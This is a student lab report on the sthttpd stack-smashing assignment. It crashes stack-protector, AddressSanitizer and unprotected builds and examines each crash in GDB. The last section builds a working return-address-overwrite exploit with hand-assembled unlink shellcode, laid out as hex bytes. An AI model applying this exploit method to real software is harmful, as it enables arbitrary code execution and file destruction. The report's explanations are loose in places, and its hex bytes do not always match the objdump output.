@@ -1,0 +1,636 @@
+Qinhao Xu
+UID: 704439324
+
+I organized my report in the following ways, other parts are just what I did for this lab:
+1. How you make the SP crash?(5 points) 2. Identify the machine instruction causing crash(5 points) 3. Explain why.(5 points)
+4. How you make the AS crash?(5 points) 5. Identify the machine instruction causing crash(5 points) 6. Explain why.(5 points)
+7. How you make the NO crash?(5 points) 8. Identify the machine instruction causing crash(5 points) 9. Explain why.(5 points)
+10. Describe the techniques used by -fstack-protector-strong and -fsanitize=address to prevent buffer-overrun exploits in handle_read (15 points)
+11. How is your exploit built? (10 points)
+
+
+Downloads the file into the directory 
+$ wget http://web.cs.ucla.edu/classes/spring17/cs33/lab/sthttpd-2.27.0.tar.gz
+
+Unzips the the files 
+$ tar -xvzf sthttpd-2.27.0.tar.gz
+
+cd into the folder and make sure I am in the path /usr/local/cs/bin/gcc.
+$ cd sthttpd-2.27.0
+$ export PATH="/usr/local/cs/bin:$PATH"
+
+Double check the path:
+$ which gcc 
+/usr/local/cs/bin/gcc
+
+
+Build sthttpd with this patch applied.
+I manually modified the file by using emacs as  following 
+
+$ emacs sthttpd-2.27.0/src/thttpd.c
+
+$ M-g M-g 999: go to the line 999
+$ M-g M-g 1012:  go to the line 1012
+
+char line[10000];
++    char line[100];
+     while ( fgets( line, sizeof(line), fp ) != (char*) 0 )
++    while ( fgets( line, 1000, fp ) != (char*) 0 )
+
+C-x C-c to save and exit emacs mode.
+
+Configure it with the shell command and call the resulting executables src/thttpd-sp, src/thttpd-as, and src/thttpd-no:
+
+$ ./configure \
+>    LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+$ mv src/thttpd src/thttpd-sp
+
+- added -static-libasan flag to clear out the errors
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'
+$ mv src/thttpd src/thttpd-as
+
+$ make clean
+$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+$ mv src/thttpd src/thttpd-no
+
+Definition of some commands from above:
+-fno-inline:
+Do not expand any functions inline apart from those marked with the alway_inline attribute. It is default when it is not optimizing.
+-fstack-protector-strong:
+A new option in gcc 4.9 named “-fstack-protector-strong”, which offers an improved version of -fstack-protector” without going all the way to “-fstack-protector-all”. 
+The stack protector feature itself adds a known canary to the stack during function preamble and checks it when the function returns. 
+If it changed, there was a stack overflow, and the program aborts.
+-fsanitize=address:
+Enable AddressSanitizer, a fast memory error detector.
+Memory access instructions are instrumented to detect out-of-bounds and use-after-free bugs.
+
+Run each of the modified sthttpd daemons under GDB on port.
+- Port numbers
+UID: 704439324
+SP: 13012 = (12330 + 3 * (4460333 % 293) + 1)
+AS: 13013 = (12330 + 3 * (4460333 % 293) + 2)
+NO: 13014 = (12330 + 3 * (4460333 % 293) + 3)
+
+I create a file called smash.txt
+$ touch smash.txt
+and then put text “I hate math”
+$ emacs smash.txt  
+
+then do the following command:
+
+$ gdb src/thttpd-sp
+(gdb) run -p 13012 -D
+
+$ gdb src/thttpd-as
+(gdb) run -p 13013 -D
+
+$ gdb src/thttpd-no
+(gdb) run -p 13014 -D
+
+I run the above commands, however after using each command , it will hang there.
+
+
+Verify that your web servers work in the normal case.
+So in order to use command curl, I open a new console and then reconnect to the server lnxsrv09
+
+$ src/thttpd-sp -p 13012 -D
+$ curl http://localhost:13012/smash.txt
+I hate math.
+
+I cd into the same directory and then use the above two commands to check the output of the smash.txt
+
+and then I kill the gdb in the old console and then start a new one 
+
+$ src/thttpd-as -p 13013 -D
+$ curl http://localhost:13013/smash.txt
+I hate math.
+
+and then I kill the gdb in the old console and then start a new one again 
+
+$ src/thttpd-no -p 13014 -D
+$ curl http://localhost:13014/smash.txt
+I hate math.
+
+Make variant SP crash by invoking it in a suitable way
+
+- To make variant SP crash, I first analyze the source code in read_config function in the  sthttpd-2.27.0/src/thttpd.c. 
+The function fgets() reads up to n-1 characters from the input stream fp. It copies the input string into the buffer buf, and then append a null character to terminate the string.
+The following is modification we made in the first step:
+-    char line[10000];
++    char line[100];
+-    while ( fgets( line, sizeof(line), fp ) != (char*) 0 )
++    while ( fgets( line, 1000, fp ) != (char*) 0 )
+
+I cd into the man page to find out the all the options in the thttpd options 
+
+-c
+Specifies a config-file to read. All options can be set either by command-line flags or in the config file. See below for details. 
+we specifies a config file to read, all the options can be set either by command-line flags or in the config file.
+-p
+Specifies an alternate port number to listen on. The default is 80. The config-file option name for this flag is "port", and the config.h option is DEFAULT_PORT.
+-d
+Specifies a directory to chdir() to at startup. This is merely a convenience - you could just as easily do a cd in the shell script that invokes the program.
+
+The config-file option name for this flag is "dir", and the config.h options.
+In this case, prevent thttpd from making itself a background daemon, instead itruns in the foreground like a regular program. 
+
+- Next, I create a file called buff.txt in src which starts with port = (a number),  followed by more than 100 characters.
+- The syntax of buff file is simple, a series of “option” or “option=value” separated by whitespace.
+- The buff file option name for -p flag “port”
+
+So I typed all the characters in buff.txt:
+port=abcdabcd dir=abcdabcd logfile=abcdabcd data_dir=abcdabcd user=abcdabcd cgipat=abcdabcd throttles=abcdabcd host=abcdabcd charset=abcdabcd p3p=abcdabcd
+
+- go into GDB 
+$ gdb src/thttpd-sp
+(gdb) run -p 13012 -D -C crash_sp.txt
+Starting program: /w/home.16/class/classqin/CS33/smashing/sthttpd-2.27.0/src/thttpd-sp -p 13012 -D -C crash_sp.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+*** stack smashing detected ***: /w/home.16/class/classqin/CS33/smashing/sthttpd-2.27.0/src/thttpd-sp terminated
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+
+Since I get the stack smashing detected like above, I used the backtrace to get the crash:
+
+(gdb) backtrace
+#0  0x00007ffff6db3118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff6db4019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00007ffff76e8636 in backtrace () from /lib64/libc.so.6
+#3  0x00007ffff7651f24 in __libc_message () from /lib64/libc.so.6
+#4  0x00007ffff76ec047 in __fortify_fail () from /lib64/libc.so.6
+#5  0x00007ffff76ec010 in __stack_chk_fail () from /lib64/libc.so.6
+#6  0x0000000000405056 in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#7  0x0000000000006463 in ?? ()
+#8  0x0000000000000018 in ?? ()
+#9  0x00007fffffffe475 in ?? ()
+#10 0x00007fffffffcfe0 in ?? ()
+#11 0x00007fffffffcf60 in ?? ()
+#12 0x00007fffffffe180 in ?? ()
+#13 0x0000000000000000 in ?? ()
+
+So what this mean?
+The value of the args that did not save in their stack frames are shown as “<optimized out>”
+
+so then I set disassemble-next-line on
+-from now, each time GDB is stooped at a breakpoint it will shows the source line followed  by the disassembly of it. Kill the child process in which currently run under GDB
+
+(gdb) set disassemble-next-line on
+(gdb) kill
+
+Next thing identify which machine insn is crashed:
+From the backtrace I see “at thttpd.c:1190”  thus I break 1190
+
+(gdb) break 1190
+(gdb) set disassemble-next-line on
+(gdb) run -p 13012 -D -C crash_sp.txt
+Starting program: /w/home.16/class/classqin/CS33/smashing/sthttpd-2.27.0/src/thttpd-sp -p 13012 -D -C crash_sp.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1190
+1190	       }
+=> 0x0000000000404f23 <read_config+1219>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+   0x0000000000404f28 <read_config+1224>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+   0x0000000000404f31 <read_config+1233>:	0f 85 1a 01 00 00 jne    0x405051 <read_config+1521>
+   0x0000000000404f37 <read_config+1239>:	48 83 c4 70 add    $0x70,%rsp
+   0x0000000000404f3b <read_config+1243>:	5b pop    %rbx
+   0x0000000000404f3c <read_config+1244>:	5d pop    %rbp
+   0x0000000000404f3d <read_config+1245>:	41 5c	  pop    %r12
+   0x0000000000404f3f <read_config+1247>:	41 5d	  pop    %r13
+   0x0000000000404f41 <read_config+1249>:	41 5e	  pop    %r14
+   0x0000000000404f43 <read_config+1251>:	c3 retq  
+
+1. How you make the SP crash?
+
+In order to understand this, at first, we need understand 
+-fstack-protector-strong:
+A new option in gcc 4.9 named “-fstack-protector-strong”, which offers an improved version of -fstack-protector” without going all the way to “-fstack-protector-all”.
+ The stack protector feature itself adds a known canary to the stack during function preamble and checks it when the function returns. 
+If it changed, there was a stack overflow, and the program aborts.
+
+2. Identify the machine instruction causing crash:
+first line:
+=> 0x0000000000404f23 <read_config+1219>:	48 8b 44 24 68	mov    0x68(%rsp),%rax
+
+the canary value “0x68(%rsp)” is moving into %rax
+
+second line:
+  0x0000000000404f28 <read_config+1224>:	64 48 33 04 25 28 00 00 00	xor    %fs:0x28,%rax
+
+third line:
+
+   0x0000000000404f31 <read_config+1233>:	0f 85 1a 01 00 00	jne    0x405051 <read_config+1521>
+
+3. why?
+if the canary value is modified , which means the current canary value is not equal to the original canary value then the code will jump to the <read_config+1521>
+
+After using three si, i get the following result which it is exactly what we wanted in this case.
+
+=> 0x0000000000405051 <read_config+1521>: e8 5a d4 ff ff  callq  0x4024b0 <__stack_chk_fail@plt> 
+
+Make variant AS crash by invoking it in a similar way.
+
+Like the previous problem, but this time I created the file called crash_as.txt and then input the following characters:
+dir=aaaaaaaaaaaa(......more than two hundred a..)aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+$ gdb src/thttpd-as
+(gdb) run -p 13013 -D -C crash_as.txt
+Starting program: /w/home.16/class/classqin/CS33/smashing/sthttpd-2.27.0/src/thttpd-as -p 13013 -D -C crash_as.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+=================================================================
+==35857==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcd54 at pc 0x00000043aec9 bp 0x7fffffffccb0 sp 0x7fffffffc460
+READ of size 222 at 0x7fffffffcd54 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+(gdb) bt
+#0  0x00007ffff7075118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7076019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004b8ae3 in __sanitizer::BufferedStackTrace::SlowUnwindStack (
+    this=0x7fffffffbbd0, pc=4435657, max_depth=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:113
+#3  0x00000000004b42e1 in __asan::GetStackTraceWithPcBpAndContext (fast=false, 
+    context=0x0, bp=140737488342192, pc=4435657, max_depth=256, 
+    stack=0x7fffffffbbd0)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_stack.h:49
+#4  __asan::ReportGenericError (pc=<optimized out>, 
+    bp=bp@entry=140737488342192, sp=sp@entry=140737488340064, 
+    addr=addr@entry=140737488342356, is_write=is_write@entry=false, 
+    access_size=access_size@entry=222, exp=<optimized out>, 
+    fatal=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_report.cc:1092
+#5  0x000000000043aee4 in __interceptor_strchr (str=<optimized out>, 
+    c=<optimized out>)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:468
+#6  0x00000000004e0b51 in read_config (filename=<optimized out>)
+    at thttpd.c:1018
+#7  0x0000000a61616161 in ?? ()
+#8  0x00007fffffffce10 in ?? ()
+---Type <return> to continue, or q <return> to quit---
+#9  0x00007fffffffe070 in ?? ()
+#10 0x00007fffffffe473 in ?? ()
+#11 0x00007fffffffcf90 in ?? ()
+#12 0x0000000000000006 in ?? ()
+#13 0x0000000000408298 in main (argc=1633771873, argv=<optimized out>)
+    at thttpd.c:380
+
+Once it crashed, I have the above result, so what I did to identify the crashed this time is by reading the backtrace above, so I noticed the following line:
+
+#6  0x00000000004e0b51 in read_config (filename=<optimized out>)
+    at thttpd.c:1018
+
+So I decided to break at line 1018.
+
+(gdb) break 1018
+(gdb) set disassemble-next-line on
+(gdb) run -p 13013 -D -C crash_as.txt
+
+Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1018
+1018	      if ( ( cp = strchr( line, '#' ) ) != (char*) 0 )
+=> 0x00000000004e0b43 <read_config+179>:    48 8b 3c 24	   mov    (%rsp),%rdi
+   0x00000000004e0b47 <read_config+183>:    be 23 00 00 00 mov    $0x23,%esi
+   0x00000000004e0b4c <read_config+188>:    e8 2f a5 f5 ff callq  0x43b080 <__interceptor_strchr(char const*, int)>
+   0x00000000004e0b51 <read_config+193>:    48 85 c0 test   %rax,%rax
+   0x00000000004e0b54 <read_config+196>:    74 24 je     0x4e0b7a <read_config+234>
+
+4. How you make the AS crash?
+
+Enable AddressSanitizer, a fast memory error detector.
+Memory access instructions are instrumented to detect out-of-bounds and use-after-free bugs.
+
+5. Identify the machine instruction causing crash
+so I noticed the following from the above machine code :
+
+   0x00000000004e0b4c <read_config+188>:  e8 2f a5 f5 ff	callq  0x43b080 <__interceptor_strchr(char const*, int)>
+
+6. why?
+it calls  <__interceptor_strchr(char const*, int)> to check the status of the shadow memory since the test is failed, the program crashed. 
+The following is the result I si twice and then get this type of result :
+(gdb) si
+__interceptor_strchr (
+    str=str@entry=0x7fffffffccf0 "dir=", 'a' <repeats 196 times>..., 
+    c=c@entry=35)
+    at ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc:457
+457 ../../../../gcc-6.3.0/libsanitizer/asan/asan_interceptors.cc: No such file or directory.
+=> 0x000000000043b080 <__interceptor_strchr(char const*, int)+0>: 48 8d 05 d5 bb 52 00	lea    0x52bbd5(%rip),%rax        # 0x966c5c <_ZN6__asan11asan_initedE>
+   0x000000000043b087 <__interceptor_strchr(char const*, int)+7>: 8b 00	mov    (%rax),%eax
+   0x000000000043b089 <__interceptor_strchr(char const*, int)+9>: 85 c0	test   %eax,%eax
+   0x000000000043b08b <__interceptor_strchr(char const*, int)+11>:   74 23     je     0x43b0b0 <__interceptor_strchr(char const*, int)+48>
+
+
+
+Likewise for variant NO.
+
+I used the same file from the previous problem
+
+$ gdb src/thttpd-no
+(gdb) run -p 13014 -D -C crash_as.txt
+Starting program: /w/home.16/class/classqin/CS33/smashing/sthttpd-2.27.0/src/thttpd-no -p 13014 -D -C crash_as.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+1190		       }
+
+(gdb) bt
+#0  0x0000000000404d9f in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#1  0x6161616161616161 in ?? ()
+#2  0x6161616161616161 in ?? ()
+#3  0x6161616161616161 in ?? ()
+#4  0x6161616161616161 in ?? ()
+#5  0x6161616161616161 in ?? ()
+#6  0x6161616161616161 in ?? ()
+#7  0x6161616161616161 in ?? ()
+#8  0x6161616161616161 in ?? ()
+#9  0x0000000061616161 in ?? ()
+#10 0x0000000000000000 in ?? ()
+
+
+(gdb) break 1190
+
+Breakpoint 1, read_config (filename=<optimized out>) at thttpd.c:1190
+1190	       }
+=> 0x0000000000404d93 <read_config+1203>:	48 83 c4 70	add    $0x70,%rsp
+   0x0000000000404d97 <read_config+1207>:	5b pop    %rbx
+   0x0000000000404d98 <read_config+1208>:	5d pop    %rbp
+   0x0000000000404d99 <read_config+1209>:	41 5c	  pop    %r12
+   0x0000000000404d9b <read_config+1211>:	41 5d	  pop    %r13
+   0x0000000000404d9d <read_config+1213>:	41 5e	  pop    %r14
+   0x0000000000404d9f <read_config+1215>:	c3 retq   
+…..
+
+7. How you make the NO crash?
+-fno-stack-protector: disable the canaries
+-zexecstack: we are able to execute any program on the stack.
+
+
+8. Identify the machine instruction causing crash
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000404d9f in read_config (filename=<optimized out>) at thttpd.c:1190
+1190		       }
+   0x0000000000404d93 <read_config+1203>:	48 83 c4 70	add    $0x70,%rsp
+   0x0000000000404d97 <read_config+1207>:	5b pop    %rbx
+   0x0000000000404d98 <read_config+1208>:	5d pop    %rbp
+   0x0000000000404d99 <read_config+1209>:	41 5c	  pop    %r12
+   0x0000000000404d9b <read_config+1211>:	41 5d	  pop    %r13
+   0x0000000000404d9d <read_config+1213>:	41 5e	  pop    %r14
+=> 0x0000000000404d9f <read_config+1215>:	c3 retq   
+(gdb) si
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+
+We saw that the program received segmentation fault after the program is terminated, which it is not after modifying the stack pointer, it actually the returning. 
+
+9. why?
+
+This is because NO does not have the buffer overflow detection like the previous problem and allows the function to work on the stack. 
+In this NO version ,it tries to access an address that has been corrupted due to buffer overflow, so it reports an error and terminated the program when the program is returning.
+
+
+
+Generate the assembly language code for thttpd.c three times.
+
+We will use -S instead of g3 02 when we compiling the file:
+
+$ make clean
+$ make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+$ mv src/thttpd.o src/thttpd-sp.s
+
+$ make clean
+$ make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+$ mv src/thttpd.o src/thttpd-as.s
+
+$ make clean
+$ make CFLAGS='-S -O2 -fno-inline -fno-stack-protector -zexecstack'
+$ mv src/thttpd.o src/thttpd-no.s
+
+In this problem, I emacs into three files thttpd-sp.s, thttpd-as.s and thttpd-no.s and do the comparison between three assembly files.
+
+Out of these three assembly code files, SP and NO versions are very similar, except the AS version, which has much differences than other two versions.
+
+10. Describe the techniques used by -fstack-protector-strong and -fsanitize=address to prevent buffer-overrun exploits in handle_read
+
+-fstack-protector-strong:
+
+A new option in gcc 4.9 named “-fstack-protector-strong”, which offers an improved version of -fstack-protector” without going all the way to “-fstack-protector-all”. 
+The -fstack-protector” itself adds a known canary to the stack during handle_read function preamble and checks it when the function returns. 
+If it changed, there was a stack overflow, and the program aborts.
+
+-fsanitize=address:
+Enable AddressSanitizer, a fast memory error detector.
+Memory access instructions are instrumented to detect out-of-bounds and use-after-free bugs. It prevents buffer-overflow exploits in handle_read is “shadow memory”.
+
+
+what is AddressSanitizer?
+
+AddressSanitizer uses shadow memory to record the safety of accessing application memory and use instrumentation to check shadow memory on each application load or store memory within the application.
+
+AddressSanitizer detects memory corruption bugs such as buffer overflows or accesses to a dangling pointer (use-after-free).
+AddressSanitizer is based on compiler instrumentation and directly-mapped shadow memory. 
+
+The following is the crucial part of assembly code from the AS version, it computed as (Addr>>3)+Offset.
+
+    shrq    $3, %rax
+        cmpb    $0, 2147450880(%rax)
+        jne     .L1178
+
+In the above conditional assembly code, the program is jumping to handle the overflow.
+
+In the AddressSanitizer, the app memory is splitting into low and high memory, which map to the corresponding shadow regions.
+ When we apply the shadow mapping to the shadow region gives us address in the and region.
+
+NO and SP are similar, because it basically crash without checking whether the program is overflow or not. 
+
+
+
+11. Build an exploit for the bug in variant NO.
+
+Step 1:
+In order to build an exploit for the bug in variant No, 
+we need to use the unlink command in the <unistd.h> library to delete the filename “target.txt” from the filesystem.
+Unlink takes in a c string pointer as an argument which is stored in %rdi, then delete the file being pointed to. 
+
+Thus I created a file called p.c:
+
+#include<unistd.h>
+int main() {
+    char file[] = "target.txt";
+    unlink(file);
+    return 0;
+}
+
+we then can compile the program using the following two commands: 
+
+$ gcc -g -c p.c
+$ objdump -d p.o
+
+p.o:     file format elf64-x86-64
+
+Disassembly of section .text:
+
+0000000000000000 <main>:
+   0:		 55			push   %rbp
+   1:		 48 89 e5             	mov    %rsp,%rbp
+   4:		 48 83 ec 10          	sub    $0x10,%rsp
+   8:		 48 b8 74 61 72 67 65 	movabs $0x742e746567726174,%rax
+   f:		 74 2e 74 
+  12:		 48 89 45 f0		mov    %rax,-0x10(%rbp)
+  16:		 66 c7 45 f8 78 74    	movw   $0x7478,-0x8(%rbp)
+  1c:		 c6 45 fa 00          	movb   $0x0,-0x6(%rbp)
+  20:		 48 8d 45 f0          	lea    -0x10(%rbp),%rax
+  24:		 48 89 c7             	mov    %rax,%rdi
+  27:		 e8 00 00 00 00       	callq  2c <main+0x2c>
+  2c:		 b8 00 00 00 00       	mov    $0x0,%eax
+  31:		 c9                   	leaveq 
+  32:		 c3                   	retq   
+
+by looking at the assembly, we can see the hex value for “target.txt” is 74 61 72 67 65 74 2e 74 78 74, but with the null byte at the end. 
+which the hex value now is 74 61 72 67 65 74 2e 74 78 74 00 in little endianness.
+
+Step 2:
+- determine the start buffer address and the return address.
+
+$ gdb src/thttpd-no
+(gdb) break read_config
+(gdb) set disassemble-next-line on
+(gdb) run -p 13014 -D -C crash_as.txt
+(gdb) p &line
+$1 = (char (*)[100]) 0x7fffffffce50
+
+-0x7fffffffce50 is the start of our buffer address 
+
+(gdb) info registers $rsp
+rsp            0x7fffffffcee8	0x7fffffffcee8
+
+the difference between the starting address 0x7fffffffce50 and returning address 0x7fffffffcee8 is is 0x98 which is in (152)Decimal 
+
+so in order to check this, we can create a file called exploit.txt, and then putting 152 characters like following:
+dir=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+$ gdb src/thttpd-no
+(gdb) run -p 13014 -D -C exploit.txt
+Starting program: /w/home.16/class/classqin/CS33/smashing/sthttpd-2.27.0/src/thttpd-no -p 13014 -D -C exploit.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000006161616161 in ?? ()
+
+To double check we can putting 153 chars it will still gives us the same errors
+since we know that the return address is at 153th from the start to the buffer we need to figure out where to put exploit code, so we can overwrite the return address.
+
+Step 3: 
+we will write raw.txt and exploit.txt.
+
+-at First, we will target.txt\0 in front of the return address. -5 is because of alignment. return address - 11 - 5=  0x7fffffffcee8 + 0xfffffffffffffff0= 0x7fffffffcef8
+
+- I create .s file call instruction.s and then input the assembly code in the files 
+$ emacs instruction.s 
+
+  movq $0x7fffffffcef8, %rdi
+        movq $0x57, %rax
+        syscall
+
+and then we compiled it with the gcc -c options and then get the assembly code of the object file using the command objdump 
+
+
+- Get the bytes corresponding to each instruction
+$ gcc -c instruction.s
+$ objdump -d innstruction.o
+
+instruction.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:		 48 bf f8 ce ff ff ff	movabs $0x7fffffffcef8,%rdi
+   7:		 7f 00 00 
+   a:		 48 c7 c0 57 00 00 00	mov    $0x57,%rax
+  11:		 0f 05                	syscall
+
+so for instruction.s’s hex dump is 48 bf c8 ce ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05 
+
+At this step, we can fill in the rest of the buffer with garbage value so I putting “dir=“ in the dir.txt and then generate the garbage value like following:
+
+$ emacs dir.txt
+$ xxd dir.txt
+0000000: 6469 723d 0a                             dir=.
+
+so the hex value is  64 69 72 3d.
+
+
+we need to add return address and buffer address into the exploit code:
+64 69 72 3d // dir.txt
+48 bf c8 ce ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05 //19 bytes in exploit code
+74 61 72 67 65 74 2e 74 78 74 00  //11 bytes of “target.txt
+
+however since need 118 bytes (152-4-19-11=118), we need to fills these with 118 bytes of garbage value 00.
+
+In order to avoid alignment issue, I putting 4 00s between the “dir=“ and exploit code, which in this case, we increment the return address by 8: 0x7fffffffce50 + 8 = 0x7fffffffce58.
+
+Data structure of the buffer could look like this:
+// dir=
+64 69 72 3d 
+// garbage bytes
+00 00 00 00 
+//exploit code
+48 bf c8 ce ff ff ff 7f 00 00 48 c7 c0 57 00 00 00 0f 05
+// garbage bytes
+00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+// target.txt 
+74 61 72 67 65 74 2e 74 
+78 74 00 00 00 00 00 00
+// return address 
+58 ce ff ff ff 7f 00 00
+
+I copied this into the raw.txt and then convert hex to raw and then putting them into the exploit.txt
+
+$ xxd -r -p raw.txt >> exploit.txt
+
+
+Testing 
+- Create target.txt under ~/sthttpd-2.27.0
+$ cd sthttpd-2.27.0
+$ emacs target.txt
+- CS33 is easy!
+
+$ gdb src/thttpd-no
+(gdb) run -p 13014 -D -C ~/CS33/smashing/sthttpd-2.27.0/exploit.txt
+Starting program: /w/home.16/class/classqin/CS33/smashing/sthttpd-2.27.0/src/thttpd-no -p 13014 -D -C ~/CS33/smashing/sthttpd-2.27.0/exploit.txt
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib64/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffced3 in ?? ()
+(gdb) quit
+
+$ ls target.txt
+ls: cannot access target.txt: No such file or directory
+
+It works!
